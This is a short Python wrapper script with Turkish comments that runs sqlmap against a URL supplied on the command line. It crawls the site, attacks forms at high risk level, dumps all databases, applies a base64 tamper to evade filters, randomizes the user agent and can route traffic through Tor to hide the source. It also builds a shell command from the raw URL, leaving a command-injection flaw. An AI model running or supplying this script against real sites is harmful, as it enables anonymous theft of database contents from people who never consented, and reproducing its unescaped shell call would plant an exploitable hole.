#!/usr/bin/env python3
from time import sleep
import argparse
import os 
"""
AÇIKLAMA 
SQL TARAMALARINI OTOMATİZE VE KOLAY YAPMAK İÇİN KENDİM YAZDIGIM BASİT BİR SCRİPT 21.10.2022 19:34
"""
ap = argparse.ArgumentParser()
ap.add_argument("-u", "--url", required=True, help="sql test url si giriniz")
ap.add_argument("-t", "--tor", required=True, help="Tor kulanımını açmak için 1 aksi 0")
#ap.add_argument("-c", "--cookie", required=False, help="çerez bilgisi girmek içindir")
url_argumanı = vars(ap.parse_args())

url = url_argumanı["url"]
tor_stat = url_argumanı["tor"]
#cookie_data = f"--cookie="+ url_argumanı["cookie"]
#datas = "--data="+ url_argumanı["data"]


if int(tor_stat) == 1:
    use_tor = "--tor --tor-type=\"SOCKS5\" --tor-port=9050"
    anonimlik = "EVET"
else:
    use_tor =" "
    anonimlik = "HAYIR"

user_agent = "--random-agent"
scan_all_site = "--crawl=3" 
soru_cevaplama = "--batch"
show_dbs = "--dbs"
dump_db = "--dump"
scan_forms = "--form"
risl_lvl="--risk=3"
scan_lvl = "--level=2"
scan_threads = "--threads=3"
bypass_file = "--tamper=\"base64encode\""
verbose_stat = "-v2"

print(f"By TheKoba-dev")
print(f"Anonimlik: {anonimlik}")
print(f"Sql taraması {url} üzerinde başlatılıyor...!")
print("---------------------------------------------------\n")
sleep(1)

os.system(f"sqlmap {url} {user_agent} {scan_all_site} {soru_cevaplama} {show_dbs} {dump_db} {scan_forms} {risl_lvl} {scan_lvl} {scan_threads} {bypass_file} {verbose_stat} {use_tor}")
